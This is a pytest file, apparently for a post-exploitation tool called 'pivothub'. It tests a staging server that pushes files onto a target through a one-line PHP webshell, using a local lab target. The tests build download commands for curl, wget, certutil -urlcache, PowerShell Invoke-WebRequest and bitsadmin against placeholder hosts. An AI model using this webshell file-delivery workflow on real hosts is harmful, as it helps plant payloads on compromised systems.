"""文件暂存 HTTP 拉取通道（上传优化）测试。

覆盖：暂存服务真实收发 / 过期与撤下 / 下载命令构造 / 工具探测解析 /
拉取编排（失败换工具 + 字节数校验）/ REST 端点端到端（miniweb 靶 + 本机 curl）。
"""

from __future__ import annotations

import base64
import os
import shutil
import sys
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

from pivothub.service import filestage
from pivothub.session.base import ExecResult

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "scripts", "lab", "miniweb"))

import miniweb  # noqa: E402


# ---------------------------------------------------------------------------
# 暂存 HTTP 服务
# ---------------------------------------------------------------------------

def test_stage_serves_exact_bytes(tmp_path):
    st = filestage.FileStageServer(bind="127.0.0.1", port=0, ttl=60, directory=tmp_path)
    try:
        data = bytes(range(256)) * 4
        item = st.add("blob.bin", data)
        with urllib.request.urlopen(
                f"http://127.0.0.1:{st.bound_port}/s/{item.token}/blob.bin", timeout=10) as resp:
            assert resp.read() == data
            assert resp.headers["Content-Length"] == str(len(data))
            assert "attachment" in resp.headers["Content-Disposition"]
        assert st.get(item.token).hits == 1
        assert st.snapshot()["running"] is True
    finally:
        st.stop()
    assert st.running is False
    assert list(tmp_path.iterdir()) == []  # 停止时清空暂存文件


def test_stage_rejects_unknown_token(tmp_path):
    st = filestage.FileStageServer(bind="127.0.0.1", port=0, directory=tmp_path)
    try:
        item = st.add("a.txt", b"x")
        for path in ("/", "/s", "/s/badtoken/a.txt", f"/other/{item.token}/a.txt"):
            with pytest.raises(urllib.error.HTTPError) as ei:
                urllib.request.urlopen(f"http://127.0.0.1:{st.bound_port}{path}", timeout=10)
            assert ei.value.code == 404
    finally:
        st.stop()


def test_stage_expiry_and_drop(tmp_path):
    st = filestage.FileStageServer(bind="127.0.0.1", port=0, ttl=60, directory=tmp_path)
    try:
        gone = st.add("gone.bin", b"data", ttl=0)
        assert st.get(gone.token) is None
        assert not gone.path.exists()
        keep = st.add("keep.bin", b"data")
        assert st.drop(keep.token) is True
        assert st.drop("nope") is False
        assert st.items() == []
    finally:
        st.stop()


def test_safe_name_is_ascii_and_traversal_free():
    assert filestage._safe_name("../../etc/passwd") == "passwd"
    assert "/" not in filestage._safe_name("a/b.bin")
    assert filestage._safe_name("") == "file.bin"
    assert all(ord(ch) < 128 for ch in filestage._safe_name("中文 名.bin"))


# ---------------------------------------------------------------------------
# 命令构造 / 工具探测解析 / 拉取编排
# ---------------------------------------------------------------------------

class _FakeSession:
    """按命令回显模拟目标机（不联网，专测编排与校验逻辑）。"""

    platform = "linux"

    def __init__(self, handler):
        self.handler = handler
        self.cmds: list[str] = []

    def exec(self, cmd, timeout=15.0):
        self.cmds.append(cmd)
        return self.handler(cmd)


def test_build_cmd_quotes_paths_per_platform():
    linux = filestage.build_cmd("curl", "linux", "http://10.0.0.1:9/s/t/f", "/tmp/a b.bin")
    assert linux.startswith("curl -fsSL") and "'/tmp/a b.bin'" in linux
    py = filestage.build_cmd("python3", "linux", "http://h/u", "/tmp/x")
    assert "urllib.request.urlretrieve" in py and "PIVOTHUB_URL=" in py
    win = filestage.build_cmd("certutil", "windows", "http://10.0.0.1:9/s/t/f", r"C:\Temp\a.bin")
    assert win.startswith("certutil -urlcache") and '"C:\\Temp\\a.bin"' in win
    ps = filestage.build_cmd("powershell", "windows", "http://h/u", r"C:\a b.bin")
    assert "Invoke-WebRequest" in ps and "'C:\\a b.bin'" in ps
    with pytest.raises(filestage.SessionError):
        filestage.build_cmd("curl", "windows", "http://h/u", 'C:\\bad"name.bin')


def test_build_verify_cmd_reads_size():
    assert "stat -c %s" in filestage.build_verify_cmd("/tmp/a.bin", "linux")
    win = filestage.build_verify_cmd(r"C:\Temp\a.bin", "windows")
    assert "Get-Item" in win and "Length" in win


def test_detect_tools_parses_real_probe_output():
    sess = _FakeSession(lambda cmd: ExecResult(
        ok=True, output="PIVOTHUB_HAVE:curl\nPIVOTHUB_HAVE:python3\n"))
    assert filestage.detect_tools(sess) == ["curl", "python3"]
    empty = _FakeSession(lambda cmd: ExecResult(ok=False, error="sh: command not found"))
    assert filestage.detect_tools(empty) == []


def test_pull_file_falls_back_to_next_tool(tmp_path):
    target = tmp_path / "got.bin"
    data = b"payload-" * 10

    def handler(cmd):
        if cmd.startswith("curl"):
            return ExecResult(ok=False, output="curl: (7) Failed to connect")
        if cmd.startswith("wget"):
            target.write_bytes(data)
            return ExecResult(ok=True, output="")
        if "stat -c %s" in cmd:
            if target.exists():
                return ExecResult(ok=True, output=str(target.stat().st_size))
            return ExecResult(ok=False, error="stat: cannot stat: No such file or directory")
        return ExecResult(ok=True, output="")

    sess = _FakeSession(handler)
    res = filestage.pull_file(sess, "http://h/u", str(target), len(data),
                              platform="linux", tools=["curl", "wget"])
    assert res.ok is True and res.tool == "wget" and res.size == len(data)
    assert any("未取到目标侧文件大小" in line for line in res.log)
    assert any("校验通过" in line for line in res.log)


def test_pull_file_reports_failure_honestly(tmp_path):
    sess = _FakeSession(lambda cmd: ExecResult(ok=False, output="boom"))
    res = filestage.pull_file(sess, "http://h/u", str(tmp_path / "none.bin"), 5,
                              platform="linux", tools=["curl", "wget"])
    assert res.ok is False and res.tool == ""
    assert "拉取失败" in res.reason and "curl/wget" in res.reason


# ---------------------------------------------------------------------------
# REST 端点端到端：miniweb 靶（Windows 命令形态）+ 本机 curl.exe
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def pull_lab(client, tmp_path_factory):
    miniweb.Handler.pwd = "cmd"
    srv = ThreadingHTTPServer(("127.0.0.1", 0), miniweb.Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    docroot = tmp_path_factory.mktemp("pull-lab")

    r = client.post("/api/hosts", json={
        "ip": "127.0.0.11", "hostname": "miniweb-pull-lab", "os": "Windows 11 (lab)",
        "layer": "L1", "note": "HTTP 拉取联调靶",
    })
    assert r.status_code == 200, r.text
    host_id = r.json()["id"]

    r = client.post("/api/shells", json={
        "hostId": host_id, "type": "PHP 一句话马",
        "url": f"http://127.0.0.1:{srv.server_address[1]}/shell.php",
        "pass": "cmd", "encoder": "none",
    })
    assert r.status_code == 200, r.text
    shell = r.json()
    assert shell["alive"] is True, "miniweb 靶应通过真实协议探针"

    yield {"shellId": shell["id"], "hostId": host_id, "docroot": str(docroot)}
    srv.shutdown()


def test_pull_tools_endpoint_detects_real_tools(client, pull_lab):
    r = client.get(f"/api/shells/{pull_lab['shellId']}/files/pull/tools")
    assert r.status_code == 200
    body = r.json()
    assert "pivothubFallback" not in body, body
    assert body["platform"] == "windows"
    keys = [t["key"] for t in body["tools"]]
    assert "powershell" in keys  # Windows 自带 PowerShell，恒可用
    assert all(t["label"] for t in body["tools"])


@pytest.mark.skipif(shutil.which("curl") is None, reason="本机无 curl，无法验证真实拉取")
def test_pull_endpoint_downloads_real_bytes(client, pull_lab):
    data = b"pivothub-pull-" + bytes(range(128))
    name = "pulled-by-curl.bin"
    r = client.post(f"/api/shells/{pull_lab['shellId']}/files/pull", json={
        "path": pull_lab["docroot"], "name": name,
        "contentB64": base64.b64encode(data).decode(),
        "host": "127.0.0.1", "tool": "curl",
    })
    body = r.json()
    assert body.get("ok") is True, body
    assert body["tool"] == "curl" and body["size"] == len(data)
    assert body["url"].startswith("http://127.0.0.1:")
    with open(os.path.join(pull_lab["docroot"], name), "rb") as fh:
        assert fh.read() == data
    assert filestage.STAGE.items() == []  # 拉取结束即撤下暂存，不留暴露面


@pytest.mark.skipif(shutil.which("curl") is None, reason="本机无 curl，无法验证真实拉取")
def test_pull_endpoint_auto_selects_tool(client, pull_lab):
    """不指定 tool：目标侧探测 → 逐个尝试，成功即返回所用工具。"""
    data = b"auto-tool-select"
    name = "pulled-auto.bin"
    r = client.post(f"/api/shells/{pull_lab['shellId']}/files/pull", json={
        "path": pull_lab["docroot"], "name": name,
        "contentB64": base64.b64encode(data).decode(), "host": "127.0.0.1",
    })
    body = r.json()
    assert body.get("ok") is True, body
    assert body["tool"] in ("curl", "certutil", "powershell", "bitsadmin")
    with open(os.path.join(pull_lab["docroot"], name), "rb") as fh:
        assert fh.read() == data


def test_stage_management_endpoints(client, pull_lab):
    r = client.get("/api/stage")
    assert r.status_code == 200
    body = r.json()
    assert "items" in body and "running" in body
    assert client.delete("/api/stage/no-such-token").json()["ok"] is False
